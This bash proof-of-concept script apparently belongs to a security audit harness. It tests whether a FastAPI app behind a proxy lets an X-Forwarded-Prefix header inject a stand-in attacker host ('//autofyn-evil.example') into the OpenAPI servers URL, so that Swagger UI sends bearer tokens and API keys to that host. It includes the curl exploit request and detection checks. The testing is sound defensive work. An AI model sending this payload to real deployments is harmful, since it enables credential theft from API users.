#!/usr/bin/env bash
# poc_08_openapi_servers_url_injection.sh — OpenAPI `servers` URL injection via
# X-Forwarded-Prefix → scope["root_path"] → applications.py:1114 servers[].url.
#
# ── Sink ─────────────────────────────────────────────────────────────────────
#   fastapi/applications.py:1108-1116 (openapi route handler, inside setup()):
#     root_path = req.scope.get("root_path", "").rstrip("/")   # line 1108
#     if root_path and self.root_path_in_servers:               # line 1110
#         server_urls = {s.get("url") for s in schema.get(...)} # line 1111
#         if root_path not in server_urls:                      # line 1112
#             schema = dict(schema)
#             schema["servers"] = [{"url": root_path}] + ...   # line 1114
#   root_path is prepended VERBATIM as the first servers[].url with no
#   validation (no URL scheme check, no host restriction, no encoding).
#   `root_path_in_servers` defaults True — the branch is always taken
#   when root_path is truthy.
#
# ── Source / data flow ───────────────────────────────────────────────────────
#   X-Forwarded-Prefix request header
#     → ProxyPrefixMiddleware (target_app/app.py:141-178) copies scope and sets
#       scope["root_path"] = header.decode("latin-1") before FastAPI.__call__
#     → applications.py:1108  root_path = req.scope.get("root_path","").rstrip("/")
#     → applications.py:1110  gate: root_path truthy AND root_path_in_servers True
#     → applications.py:1114  schema["servers"] = [{"url": root_path}] + ...
#     → JSONResponse returns {"servers":[{"url":"//attacker"},...], ...}
#     → Swagger UI reads this as the API base URL for "Try it out" / "Authorize"
#
# ── Precondition (PROMINENT — do NOT overstate exploitability) ────────────────
#   In a BARE uvicorn deployment root_path is a STATIC startup value set via
#   `uvicorn --root-path` or `FastAPI(root_path=...)` — NOT client-controllable
#   per-request.  Default uvicorn-without-proxy is NOT remotely exploitable.
#
#   Exploitable ONLY when a reverse proxy (nginx / Traefik / k8s-ingress) or
#   ASGI middleware maps an UNTRUSTED request header (X-Forwarded-Prefix,
#   X-Script-Name, etc.) into scope["root_path"] — the documented FastAPI
#   "Behind a Proxy" pattern.  ProxyPrefixMiddleware in target_app/app.py
#   faithfully represents this deployment; no new wiring needed.
#
# ── PASS/FAIL semantics (FINDING check — SAME convention as poc_07) ───────────
#   poc_08 is a FINDING check (same semantics as poc_07, opposite of poc_01–06):
#     FAIL = attacker host appears as servers[].url = CONFIRMED injection finding.
#     PASS = server URL is clean / sanitized = defense held.
#   THIS POC IS EXPECTED TO FAIL ON THIS COMMIT.
#   A FAIL from this PoC is the correct, valid audit output — it is NOT a
#   harness bug.  run_all.sh prints "REAL FINDING DETECTED" on FAIL, which is
#   the intended behavior for a confirmed security finding.
#
# ── Detection logic ───────────────────────────────────────────────────────────
#   Payload header: X-Forwarded-Prefix: //autofyn-evil.example
#   //autofyn-evil.example has no trailing slash → rstrip("/") leaves it unchanged.
#   applications.py:1114 prepends {"url":"//autofyn-evil.example"} into servers[].
#   Impact: Swagger UI "Try it out" / "Authorize" sends API requests to attacker
#   host; any bearer token, cookie, or API key passed via Swagger is exfiltrated.
#
#   Assertion order (CR-2 — must NOT emit vacuous PASS):
#     1. Positive control: GET /openapi.json (no header) must be 200 + "openapi".
#     2. Teeth-test (a): same body must NOT contain "autofyn-evil.example"
#        (servers key absent by default → marker can't appear without header).
#     3. Benign control: /api/v1 prefix reflects into servers (injection confirmed
#        for legitimate values — proves sink is header-driven, informational only).
#     4. CR-2 guard: exploit header sent → marker MUST appear somewhere in body;
#        absence means precondition not satisfied (harness/config failure).
#     5. Finding judgment: body contains BOTH '"servers"' AND "//autofyn-evil.example"
#        → FAIL (finding confirmed); else → PASS (defense held).
#
# ── Independence from poc_07 ─────────────────────────────────────────────────
#   poc_07 endpoint: /docs (HTML)  sink: docs.py:168  class: reflected XSS
#   poc_08 endpoint: /openapi.json (JSON)  sink: applications.py:1114  class: server-URL hijack
#   Same source/precondition (X-Forwarded-Prefix → root_path) — DISTINCT impact/sink.
#
# ── Severity ─────────────────────────────────────────────────────────────────
#   MEDIUM (conditional) — do NOT inherit poc_07's HIGH.
#   Impact: bearer tokens / API keys passed via Swagger "Authorize" + "Try it out"
#   are redirected to the attacker host (credential exfiltration + open redirect
#   of API traffic).  Requires: (1) proxy-prefix precondition AND (2) a human
#   exercising authorized Swagger requests.  Not script-execution, not
#   unauthenticated mass impact → MEDIUM.
#
# ── Upstream note ────────────────────────────────────────────────────────────
#   fastapi/applications.py is byte-identical to upstream FastAPI 0.137.1.
#   This is an INHERITED weakness, not a fork-planted backdoor.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/pins.sh
source "${SCRIPT_DIR}/../lib/pins.sh"
# shellcheck source=../lib/common.sh
source "${SCRIPT_DIR}/../lib/common.sh"

BASE_URL="${1:?Base URL required as \$1}"
OPENAPI_URL="${BASE_URL}/openapi.json"

echo "=== poc_08: OpenAPI servers URL injection via X-Forwarded-Prefix → applications.py:1114 ==="
echo "Sink        : fastapi/applications.py:1108-1116 — schema[\"servers\"]=[{\"url\":root_path}]+..."
echo "Source      : fastapi/applications.py:1108 — root_path = req.scope.get(\"root_path\",\"\").rstrip(\"/\")"
echo "Precondition: ProxyPrefixMiddleware maps X-Forwarded-Prefix → scope[\"root_path\"]"
echo "Payload     : X-Forwarded-Prefix: //autofyn-evil.example"
echo "Expected    : FAIL (attacker host in servers[].url = real finding)"
echo ""

PASS=1

# ── Positive control ──────────────────────────────────────────────────────────
# Confirms /openapi.json serves a valid OpenAPI document (no malicious header).
# The default schema has NO "servers" key at all (that key is only added by the
# branch at applications.py:1110-1116 which requires a truthy root_path).
echo "--- Positive control: GET /openapi.json (no malicious header) ---"
PC_CODE="$(curl -sS -o /tmp/poc08_pc.txt -w "%{http_code}" \
    --max-time 10 \
    "${OPENAPI_URL}" 2>&1 || echo "000")"
PC_BODY="$(cat /tmp/poc08_pc.txt 2>/dev/null || echo "")"
echo "HTTP ${PC_CODE}"

if [[ "$PC_CODE" != "200" ]]; then
    echo "[FAIL] Positive control: /openapi.json returned HTTP ${PC_CODE} — endpoint broken or /openapi.json disabled"
    PASS=0
elif ! assert_contains "${PC_BODY}" '"openapi"'; then
    echo "[FAIL] Positive control: body does not contain '\"openapi\"' — not a valid OpenAPI document"
    PASS=0
else
    echo "[OK] Positive control: /openapi.json returned 200 and contains '\"openapi\"' — valid OpenAPI doc"
fi
echo ""

if (( PASS == 0 )); then
    print_check "openapi_servers_url_injection" "FAIL" \
        "positive control failed — /openapi.json broken; cannot assess servers URL injection"
    exit 0
fi

# ── Teeth-test (a): no-header control — marker must be absent without the header ──
# Confirms non-vacuousness: the servers key is absent by default so the attacker
# marker cannot appear without the exploit header.  Any presence here means a
# harness contamination problem.
echo "--- Teeth-test (a): confirm attacker marker ABSENT from clean /openapi.json ---"
if assert_contains "${PC_BODY}" "autofyn-evil.example"; then
    echo "[ERROR] Attacker marker 'autofyn-evil.example' found in /openapi.json WITHOUT the exploit header."
    echo "        This indicates harness contamination or test state pollution."
    print_check "openapi_servers_url_injection" "FAIL" \
        "marker present in /openapi.json without exploit header — test contaminated; cannot assess"
    exit 0
fi
echo "[OK] Teeth-test (a): 'autofyn-evil.example' absent from clean /openapi.json — non-vacuous baseline confirmed"
echo ""

# ── Benign control: /api/v1 prefix reflects into servers (informational) ──────
# Sends a legitimate relative prefix to confirm the injection point is real and
# header-driven for benign values.  No AUDIT-RESULT is emitted for this step —
# it is informational only, demonstrating that the field is driven by the header.
# Per spec-review suggestion: assert tied to the "servers" key, not just /api/v1
# appearing anywhere in the schema (which could match a path entry).
echo "--- Benign control: X-Forwarded-Prefix: /api/v1 — should appear as servers[].url ---"
BN_CODE="$(curl -sS -o /tmp/poc08_benign.txt -w "%{http_code}" \
    --max-time 10 \
    -H "X-Forwarded-Prefix: /api/v1" \
    "${OPENAPI_URL}" 2>&1 || echo "000")"
BN_BODY="$(cat /tmp/poc08_benign.txt 2>/dev/null || echo "")"
echo "HTTP ${BN_CODE}"

if assert_contains "${BN_BODY}" '"servers"' && assert_contains "${BN_BODY}" '/api/v1'; then
    echo "[OK] Benign control: '/api/v1' reflected into 'servers' field — injection point is header-driven (informational)"
else
    echo "[INFO] Benign control: '/api/v1' not found inside 'servers' field — precondition may not be satisfied for this step; continuing"
fi
echo ""

# ── Exploit request ───────────────────────────────────────────────────────────
# Payload: X-Forwarded-Prefix: //autofyn-evil.example
# //autofyn-evil.example has no trailing slash → rstrip("/") leaves it unchanged.
# applications.py:1110 gate: root_path truthy AND root_path_in_servers defaults True → taken.
# applications.py:1114: schema["servers"] = [{"url": "//autofyn-evil.example"}] + ...
echo "--- Exploit: GET /openapi.json with X-Forwarded-Prefix: //autofyn-evil.example ---"
ATK_CODE="$(curl -sS -o /tmp/poc08_atk.txt -w "%{http_code}" \
    --max-time 10 \
    -H "X-Forwarded-Prefix: //autofyn-evil.example" \
    "${OPENAPI_URL}" 2>&1 || echo "000")"
ATK_BODY="$(cat /tmp/poc08_atk.txt 2>/dev/null || echo "")"
echo "HTTP ${ATK_CODE}"
echo ""

# ── CR-2 guard: confirm attacker marker was reflected at all ──────────────────
# If autofyn-evil.example is entirely absent the ProxyPrefixMiddleware precondition
# was not met (header was not mapped into root_path).  This is a harness/config
# failure — NOT a passing defense.  Match poc_07's Step-1 pattern exactly.
if ! assert_contains "${ATK_BODY}" "autofyn-evil.example"; then
    echo "[ERROR] Marker 'autofyn-evil.example' is entirely absent from the /openapi.json response."
    echo "        X-Forwarded-Prefix was NOT reflected into root_path."
    echo "        The ProxyPrefixMiddleware precondition is not satisfied."
    echo "        This is a harness/configuration failure — NOT a defense pass."
    print_check "openapi_servers_url_injection" "FAIL" \
        "X-Forwarded-Prefix not reflected into root_path — middleware precondition not satisfied"
    exit 0
fi

echo "[OK] Marker 'autofyn-evil.example' present in response — header was reflected into root_path"
echo ""

# ── Finding judgment: confirm marker is specifically inside servers[].url ──────
# The finding requires both '"servers"' AND '//autofyn-evil.example' in the body.
# '"servers"' is the JSON key; '//autofyn-evil.example' is the injected URL value.
# Together they confirm the attacker value was placed as a server URL, not merely
# echoed in some other field (e.g. a path-operation description).
# We do NOT hard-match exact JSON whitespace (JSONResponse uses ", "/" ": " seps).
echo "--- Finding judgment: check for '\"servers\"' AND '//autofyn-evil.example' in body ---"
if assert_contains "${ATK_BODY}" '"servers"' && assert_contains "${ATK_BODY}" '//autofyn-evil.example'; then
    echo "[FAIL] Both '\"servers\"' and '//autofyn-evil.example' found in /openapi.json response."
    echo "       The attacker host is now the first servers[].url in the OpenAPI document."
    echo "       Swagger UI will use this as the API base URL for 'Try it out' / 'Authorize' calls."
    echo "       Any bearer token or API key passed through Swagger is redirected to the attacker."
    print_check "openapi_servers_url_injection" "FAIL" \
        "attacker host injected as first servers[].url (applications.py:1114); source X-Forwarded-Prefix mapped via applications.py:1108; Swagger API base URL hijacked; MEDIUM finding confirmed under proxy-prefix precondition"
else
    echo "[OK] Attacker host NOT found inside 'servers' field — root_path sanitized or not reflected into servers."
    echo "     The injection point was not exploitable — defense held."
    print_check "openapi_servers_url_injection" "PASS" \
        "root_path sanitized or not reflected into servers[].url — defense held (applications.py:1114)"
fi
